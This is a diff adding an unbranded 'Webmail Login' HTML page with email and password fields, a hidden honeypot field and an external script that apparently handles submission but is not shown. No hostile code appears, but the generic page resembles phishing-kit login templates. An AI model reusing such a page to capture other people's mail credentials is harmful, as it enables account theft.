@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Webmail Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="login-box">
+
+    <!-- HEADER -->
+    <div class="login-header">
+        
+        
+        <div class="logo">✉️</div>
+        <h2>Webmail Login</h2>
+    </div>
+
+    <!-- FORM -->
+
+
+
+
+<form id="loginForm">
+
+    <input id="email" name="email" placeholder="Email Address" required>
+
+    <input type="password" id="password" name="password" placeholder="Password" required>
+
+
+
+
+
+        <!-- 🛡️ BOT PROTECTION (IMPORTANT ADDITION) -->
+        <input type="text" id="website" name="website" style="display:none">
+
+        <button type="submit">Sign in</button>
+
+        <div class="options">
+            <label>
+                <input type="Checkbox"> Secure login
+            </label>
+
+            <a href="#">Forgot Password?</a>
+        </div>
+
+    </form>
+
+    <!-- MESSAGE AREA -->
+    <div id="msg"></div>
+
+</div>
+
+<script src="ap.js"></script>
+
+</body>
+</html>
